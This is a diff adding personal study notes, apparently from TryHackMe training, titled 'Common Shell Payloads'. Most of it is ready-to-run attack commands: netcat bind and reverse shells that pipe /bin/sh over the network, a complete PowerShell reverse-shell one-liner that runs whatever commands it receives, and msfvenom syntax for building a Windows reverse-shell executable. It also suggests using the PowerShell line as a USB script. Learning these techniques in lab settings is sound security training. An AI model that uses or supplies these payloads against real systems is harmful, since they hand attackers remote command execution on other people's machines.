@@ -1,0 +1,38 @@
+#Common Shell Payloads
+Netcat
+Bind Shell:
+on the target machine: mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+our attack machine:nc <ip> <port>
+
+Reverse Shell:
+on the target machine:mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+on our attack machine:nc -nvlp <port>
+
+For Windows:
+target machine:
+
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+(note:i think it can be also used as the rasberry pie or usb script)
+In order to use this, we need to replace "<IP>" and "<port>" with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell
+links maybe usefull:https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+MSFVENOM:
+the Standart Syntax of MSFVENOM
+
+msfvenom -p <PAYLOAD> <OPTIONS>
+
+For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
+
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+
+Here we are using a payload and four options:
+
+    -f <format>
+        Specifies the output format. In this case that is an executable (exe)
+    -o <file>
+        The output location and filename for the generated payload.
+    LHOST=<IP>
+        Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.
+    LPORT=<port>
+        The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.
